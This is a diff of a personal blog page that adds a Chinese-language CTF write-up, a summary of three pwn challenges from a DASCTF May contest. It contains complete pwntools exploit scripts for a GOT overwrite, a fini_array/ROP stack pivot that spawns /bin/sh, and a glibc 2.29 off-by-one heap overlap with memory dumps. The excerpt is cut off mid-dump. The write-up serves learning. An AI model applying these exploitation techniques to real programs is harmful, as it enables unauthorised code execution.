@@ -6,15 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/6 | one day day</title>
+  <title>dasctf5月pwn部分总结 | one day day</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="one day day">
-<meta property="og:url" content="http://yoursite.com/archives/2020/06/index.html">
+  <meta name="description" content="五月份打了一场dasctf月赛,我果然还是那么菜,这段时间把上次dasctf比赛中遇到的问题都总结了一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dasctf5月pwn部分总结">
+<meta property="og:url" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="one day day">
+<meta property="og:description" content="五月份打了一场dasctf月赛,我果然还是那么菜,这段时间把上次dasctf比赛中遇到的问题都总结了一下。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn1-sys.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/bin_fish.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/fini.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby2-1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby2-2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/easybaby3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/secret3.png">
+<meta property="article:published_time" content="2020-07-10T06:13:00.000Z">
+<meta property="article:modified_time" content="2020-07-13T13:46:51.982Z">
 <meta property="article:author" content="SPiCa">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check.png">
   
     <link rel="alternative" href="/atom.xml" title="one day day" type="application/atom+xml">
   
@@ -138,60 +160,247 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-dasctf5月pwn部分总结" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/08/2020-6-8-java%E5%AE%9E%E8%AE%AD/" class="archive-article-date">
-  	<time datetime="2020-06-08T15:53:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-08</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/08/2020-6-8-java%E5%AE%9E%E8%AE%AD/">java一次实训</a>
+    <h1 class="article-title" itemprop="name">
+      dasctf5月pwn部分总结
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2020-07-10T06:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>五月份打了一场dasctf月赛,我果然还是那么菜,这段时间把上次dasctf比赛中遇到的问题都总结了一下。</p>
+<a id="more"></a>
+
+
+
+<h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory_Monster_I"></a>Memory_Monster_I</h2><p>检查保护</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check.png" class="">
+<p>拖进IDA分析</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn1.png" class="">
+<p>特意把右边函数截图出来，看到有system查看引用</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn1-sys.png" class="">
+<p>简单分析可知main函数有两个read输入第一个有栈溢出漏洞，第二个read输入内容到第一个read指定的地址(相当于任意写0x18个字节)。<br><strong>解题思路：</strong></p>
+<ul>
+<li>第一个read写入stack_chk_fail的got地址</li>
+<li>第二个read写入system地址</li>
+<li>使用第一个read触发canary<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process('./Memory_Monster_I')</span></span><br><span class="line">io = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10082</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = p64(<span class="number">0x404028</span>)*<span class="number">8</span></span><br><span class="line">io.sendlineafter(<span class="string">'addr:'</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0x40124A</span>)</span><br><span class="line">io.sendafter(<span class="string">'data:'</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory_Monster_II"></a>Memory_Monster_II</h2>检查保护</li>
+</ul>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check2.png" class="">
+<p>拖进IDA分析发现是个静态链接的程序找到start中__libc_start_main第一个参数就是main函数</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn2.png" class="">
+<p>找一下有没有后门,在查找时字符串中找到一个bin/fish(后门没有陷阱到是有,关键是我还踩进去了)</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/bin_fish.png" class="">
+<p><strong>解题思路：</strong><br>很明显这题单次写入3个字节是无法直接拿到shell的，但是我们可以让单次写变成多次写。</p>
+<blockquote>
+<p>在写exp之前得先知道一个知识点：</p>
+</blockquote>
+<p>程序在结束时会自动调用一个函数名为__libc_csu_fini的函数</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/fini.png" class="">
+<p>这个函数会从后往前依次调用fini_array数组地址里的函数(图中的0x4b80b0就是fini_array数组)<br>有了这个知识点就可以获取shell了</p>
+<ul>
+<li>将fini_array数组变成fini_array[0] = __libc_csu_fini ，fini_array[1]=main 构成一个循环调用。</li>
+<li>由于有canary保护因此使用栈迁移来完成rop，选择fini_array+0x10后面的地址作为栈迁移的目标，然后在循环过程中填充代码。</li>
+<li>触发栈迁移获取shell</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process('./Memory_Monster_II')</span></span><br><span class="line">io = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10101</span>)</span><br><span class="line">raw_input()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">fini = <span class="number">0x402CB0</span></span><br><span class="line">main = <span class="number">0x401C1D</span></span><br><span class="line">fini_array = <span class="number">0x4B80B0</span></span><br><span class="line">leave = <span class="number">0x401CF3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span><span class="params">(addr,content)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'addr:'</span>,addr)</span><br><span class="line">    io.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line">payload =p64(fini) + p64(main)</span><br><span class="line"><span class="comment"># 构建循环调用</span></span><br><span class="line">overwrite(p64(fini_array),payload)</span><br><span class="line"><span class="comment"># 使用ROPgadget获取gadget</span></span><br><span class="line">pop_rdi = <span class="number">0x401746</span></span><br><span class="line">pop_rsi = <span class="number">0x406f80</span></span><br><span class="line">pop_rdx = <span class="number">0x448415</span> </span><br><span class="line">pop_rax = <span class="number">0x448fcc</span></span><br><span class="line">sh = <span class="number">0x4BEEC0</span></span><br><span class="line"><span class="comment">#在将要迁移的栈上放入rop内容</span></span><br><span class="line">payload = p64(sh)+p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">overwrite(p64(fini_array+<span class="number">0x10</span>),payload)</span><br><span class="line">payload = p64(pop_rdx)+p64(<span class="number">0</span>)+p64(pop_rax)</span><br><span class="line">overwrite(p64(fini_array+<span class="number">0x10</span>+<span class="number">0x18</span>),payload)</span><br><span class="line">payload = p64(<span class="number">59</span>)+p64(<span class="number">0x402514</span>)</span><br><span class="line">overwrite(p64(fini_array+<span class="number">0x10</span>+<span class="number">0x18</span>+<span class="number">0x18</span>),payload) </span><br><span class="line">payload = <span class="string">'//bin//sh'</span></span><br><span class="line">overwrite(p64(sh),payload)</span><br><span class="line"><span class="comment"># 跳转到leave ret指令下完成栈迁移</span></span><br><span class="line">payload=p64(leave) +p64(pop_rdi)</span><br><span class="line">overwrite(p64(fini_array),payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="happyending"><a href="#happyending" class="headerlink" title="happyending"></a>happyending</h2><p>题目环境:libc2.29<br>检查保护</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/check3.png" class="">
+<p>IDA分析</p>
+<img src="/2020/07/10/dasctf5%E6%9C%88pwn%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/pwn3.png" class="">
+<p>程序有添加删除和读取功能其中在添加功能中有一个非常明显的off-by-one漏洞(上图)<br><strong>解题思路</strong><br>这题和传统使用off-by-one造成块重叠的利用方法不一样因为他是在2.29环境下的，由于2.29针对这个漏洞有了新的检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">       malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>
+<p>因为这个检查的出现导致了我们需要绕过这个检查（原本可以使用系统已经删除的块）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br></pre></td></tr></table></figure>
+<p>大致的思路是使用largechunk被释放后残留下来的fd_nextsize和bk_nextsize用来作为伪造块的 fd和bk(用以绕过fd-&gt;bk!=p 和bk-&gt;fd!=p)最后使用off-by-one使目标块和伪造块合并.<br>具体细节可以看这位大佬的帖子，写的非常详细了<a href="https://bbs.pediy.com/thread-257901.html" target="_blank" rel="noopener">点击链接</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭aslr</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/glibc-2.29/lib/libc-2.29.so'</span>)</span><br><span class="line">raw_input()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chose</span><span class="params">(ch)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;\n'</span>,str(ch))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    chose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Your blessing words length :'</span>,str(size))</span><br><span class="line"></span><br><span class="line">    io.sendafter(<span class="string">'Best wishes to them!'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    chose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'input the idx to clean the debuff :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    chose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'input the idx to show your blessing :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addplus</span><span class="params">(num,size,content)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        add(size,content)</span><br><span class="line">addplus(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">'tcahce'</span>) <span class="comment">#0-6 (绕过tcache)</span></span><br><span class="line">add(<span class="number">0x5c80</span>,<span class="string">'padding'</span>)<span class="comment">#7 </span></span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">填充块--因为程序会在结尾加一个/x00(在上面ida分析read代码的漏洞)</span><br><span class="line">所以当我们只修改最后一个字节时必须保证倒数第二个字节是\x00,由于开启了aslr这个填充块只能靠爆破来尝试</span><br><span class="line">概率是<span class="number">1</span>/<span class="number">16</span></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="comment"># largin bin用来获取需要的残余地址</span></span><br><span class="line">add(<span class="number">0xa00</span>,<span class="string">'largin'</span>) <span class="comment">#8</span></span><br><span class="line"><span class="comment"># 用来防止和top结合的块 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'avoid'</span>) <span class="comment">#9</span></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x140</span>)+p8(<span class="number">0xf0</span>))<span class="comment"># 8</span></span><br><span class="line">addplus(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">'use'</span>) <span class="comment">#10-15</span></span><br><span class="line">-----------------</span><br><span class="line"><span class="number">0x555555560030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span>  &lt;--chunk1</span><br><span class="line"><span class="number">0x555555560040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000140</span> &lt;--依赖largin残留的伪造块 </span><br><span class="line"><span class="number">0x555555560050</span>:	<span class="number">0x00005555555600f0</span>	<span class="number">0x0000555555560030</span>  </span><br><span class="line"><span class="number">0x555555560060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk2</span><br><span class="line"><span class="number">0x555555560070</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x555555560080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk3</span><br><span class="line"><span class="number">0x5555555600a0</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x5555555600b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555600c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk4</span><br><span class="line"><span class="number">0x5555555600d0</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x5555555600e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555600f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk5</span><br><span class="line"><span class="number">0x555555560100</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x555555560110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk6</span><br><span class="line"><span class="number">0x555555560130</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x555555560140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> &lt;--chunk7</span><br><span class="line"><span class="number">0x555555560160</span>:	<span class="number">0x00007fff00657375</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x555555560170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000008c1</span> </span><br><span class="line"><span class="number">0x555555560190</span>:	<span class="number">0x00007ffff7fc8ca0</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line">-----------------</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">addplus(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">'tcahce'</span>) <span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x28</span>,p8(<span class="number">0x40</span>)) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'use'</span>) <span class="comment">#10</span></span><br><span class="line">-------------------</span><br><span class="line">chunk1使用fastbin构造使得chun1_fd-&gt;fake_bk</span><br><span class="line"><span class="number">0x555555560030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555560040</span>:	<span class="number">0x0000555555560040</span>	<span class="number">0x0000000000000140</span></span><br><span class="line">-------------------</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">0xa00</span>,<span class="string">'largin'</span>) <span class="comment">#0</span></span><br><span class="line">---------------------------</span><br><span class="line">删除两个连续的fastbin块然后申请一个larginbin触发块结合得到下面的smallbin</span><br><span class="line">//截取glibc2<span class="number">.29</span>/malloc.c</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x555555560060</span> —▸ <span class="number">0x5555555600f0</span> —▸ <span class="number">0x7ffff7fc8cf0</span> (main_arena+<span class="number">176</span>) ◂— <span class="number">0x555555560060</span> /* <span class="string">'`'</span> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line"></span><br><span class="line">addplus(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">'tcahce'</span>) <span class="comment">#1-6 10</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x40</span>)) <span class="comment">#11</span></span><br><span class="line">----------------------------</span><br><span class="line"></span><br><span class="line">申请刚刚被删除的small块利用残留的地址完成</span><br><span class="line">使得chunk5的bk指向fake_chunk</span><br><span class="line"><span class="number">0x5555555600f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555560100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000555555560040</span></span><br><span class="line"></span><br><span class="line">----------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'use'</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">'merge'</span>)<span class="comment">#14</span></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="number">0x20</span>*<span class="string">'a'</span>+p64(<span class="number">0x140</span>)) <span class="comment"># 15</span></span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'\x00'</span>)</span><br><span class="line">-------------------------</span><br><span class="line">利用off—by-one将size中的标志位置<span class="number">0</span>然后将prevsize置成和伪造块一致</span><br><span class="line">并且成功绕过两个检查</span><br><span class="line"><span class="number">0x555555560030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555560040</span>:	<span class="number">0x0000555555560040</span>	<span class="number">0x0000000000000140</span></span><br><span class="line"><span class="number">0x555555560050</span>:	<span class="number">0x00005555555600f0</span>	<span class="number">0x0000555555560030</span></span><br><span class="line"><span class="number">0x555555560060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555560070</span>:	<span class="number">0x0000000000657375</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555560090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555600a0</span>:	<span class="number">0x00005555555600f0</span>	<span class="number">0x00007ffff7fc8ca0</span></span><br><span class="line"><span class="number">0x5555555600b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555600c0</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000031</span></span><br><span 